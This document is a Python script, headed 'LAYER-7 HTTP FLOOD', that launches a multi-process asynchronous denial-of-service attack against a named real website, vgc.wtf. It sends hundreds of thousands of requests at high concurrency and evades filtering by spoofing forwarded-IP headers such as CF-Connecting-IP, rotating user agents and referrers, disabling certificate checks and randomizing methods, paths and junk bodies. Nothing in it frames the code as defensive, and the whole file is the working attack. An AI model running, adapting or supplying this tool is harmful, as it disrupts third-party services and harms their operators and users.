import asyncio
import aiohttp
import random
import time
import socket
import ssl
from urllib.parse import urljoin
from fake_useragent import UserAgent
from multiprocessing import Process, cpu_count, Value

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

TARGET = "https://vgc.wtf"
TOTAL_REQUESTS = 500000
CONCURRENT = 5000
TIMEOUT = 4
PROCESSES = max(4, cpu_count())
BATCH_SIZE = 5000
ua = UserAgent()

ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8",
]

LANGUAGES = [
    "en-US,en;q=0.9",
    "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
]

REFERRERS = [
    "https://www.google.com/search?q=vgc.wtf",
    "https://www.bing.com/search?q=vgc.wtf",
    "https://duckduckgo.com/?q=vgc.wtf",
    "https://yandex.com/search/?text=vgc.wtf",
    "https://www.facebook.com/",
    "https://t.co/",
    "https://www.youtube.com/",
    "https://www.reddit.com/r/gaming/",
    "https://vgc.wtf/",
    "https://discord.com/",
    "https://twitter.com/",
    "https://www.twitch.tv/",
    "https://steamcommunity.com/",
    "",
]

PATHS = [
    "/", "/home", "/about", "/contact", "/api", "/api/v1", "/api/v2",
    "/login", "/register", "/auth", "/user", "/profile", "/settings",
    "/search", "/s", "/q", "/p", "/page", "/post", "/blog",
    "/assets", "/static", "/css", "/js", "/img", "/images", "/fonts",
    "/wp-admin", "/wp-content", "/wp-includes", "/admin", "/panel",
    "/api/users", "/api/posts", "/api/data", "/api/info", "/api/status",
    "/robots.txt", "/sitemap.xml", "/favicon.ico", "/.env", "/config",
]

QUERIES = [
    "", "?id=1", "?page=1", "?q=test", "?search=hello", "?user=admin",
    "?token=abc123", "?ref=google", "?utm_source=google", "?lang=en",
    "?sort=desc", "?limit=10", "?offset=0", "?format=json", "?callback=cb",
    "?v=1.0", "?t=" + str(int(time.time())),
]

def random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def random_headers():
    ip = random_ip()
    return {
        "User-Agent": ua.random,
        "Accept": random.choice(ACCEPTS),
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "must-revalidate"]),
        "Upgrade-Insecure-Requests": "1",
        "Referer": random.choice(REFERRERS),
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Client-IP": ip,
        "CF-Connecting-IP": ip,
        "True-Client-IP": ip,
        "X-Client-IP": ip,
        "X-Originating-IP": ip,
        "X-Remote-IP": ip,
        "X-Remote-Addr": ip,
        "Forwarded": f"for={ip};proto=https;by={random_ip()}",
        "Via": f"1.1 {random_ip()}",
        "DNT": random.choice(["1", "0"]),
        "Sec-Fetch-Dest": random.choice(["document", "empty", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["none", "cross-site", "same-origin"]),
        "Sec-Fetch-User": "?1",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": random.choice(["\"Windows\"", "\"macOS\"", "\"Linux\""]),
        "Priority": random.choice(["u=0, i", "u=1, i"]),
        "TE": "trailers",
    }

def random_url():
    path = random.choice(PATHS)
    query = random.choice(QUERIES)
    if query == "?t=" + str(int(time.time())):
        query = f"?t={int(time.time()) + random.randint(-3600, 3600)}"
    return f"{TARGET}{path}{query}"

async def worker(session, sem, stats):
    async with sem:
        url = random_url()
        headers = random_headers()
        method = random.choice(["GET", "HEAD", "POST", "PUT", "PATCH", "DELETE"])
        try:
            if method in ("POST", "PUT", "PATCH"):
                data = random.choice([
                    None,
                    {"key": "value", "test": True},
                    "data=test&foo=bar",
                    b"\x00" * random.randint(10, 1000),
                ])
                async with session.request(method, url, headers=headers, data=data, timeout=TIMEOUT) as resp:
                    await resp.read()
            else:
                async with session.request(method, url, headers=headers, timeout=TIMEOUT) as resp:
                    await resp.read()
            stats["ok"] += 1
        except:
            stats["fail"] += 1

async def run_flood(worker_id, req_count):
    stats = {"ok": 0, "fail": 0}

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    connector = aiohttp.TCPConnector(
        limit=CONCURRENT,
        limit_per_host=CONCURRENT,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True,
        ssl=ssl_ctx,
        keepalive_timeout=30,
        use_dns_cache=True,
        family=socket.AF_INET,
    )

    timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=2, sock_read=TIMEOUT)
    sem = asyncio.Semaphore(CONCURRENT)

    start = time.time()

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        raise_for_status=False,
    ) as session:
        tasks = [worker(session, sem, stats) for _ in range(req_count)]

        for i in range(0, req_count, BATCH_SIZE):
            batch = tasks[i:i + BATCH_SIZE]
            await asyncio.gather(*batch, return_exceptions=True)

            done = stats["ok"] + stats["fail"]
            elapsed = time.time() - start
            rps = done / elapsed if elapsed > 0 else 0
            print(f"[P{worker_id:02d}] {done:>7}/{req_count} | OK:{stats['ok']:>6} FAIL:{stats['fail']:>6} | {rps:>7.0f} rps")

    elapsed = time.time() - start
    print(f"[P{worker_id:02d}] BİTTİ → OK:{stats['ok']} FAIL:{stats['fail']} | {elapsed:.1f}s | {stats['ok']/elapsed:.0f} avg rps")

def process_entry(worker_id, req_count):
    asyncio.run(run_flood(worker_id, req_count))

def main():
    print("=" * 60)
    print("  LAYER-7 HTTP FLOOD")
    print("=" * 60)
    print(f"[*] Target       : {TARGET}")
    print(f"[*] Total req    : {TOTAL_REQUESTS}")
    print(f"[*] Concurrent   : {CONCURRENT}")
    print(f"[*] Processes    : {PROCESSES}")
    print(f"[*] Batch size   : {BATCH_SIZE}")
    print("[*] Başlıyor...\n")

    per_process = TOTAL_REQUESTS // PROCESSES
    extra = TOTAL_REQUESTS % PROCESSES

    procs = []
    for i in range(PROCESSES):
        count = per_process + (1 if i < extra else 0)
        p = Process(target=process_entry, args=(i + 1, count))
        p.start()
        procs.append(p)

    for p in procs:
        p.join()

    print("\n[+] Bitti.")

if __name__ == "__main__":
    main()
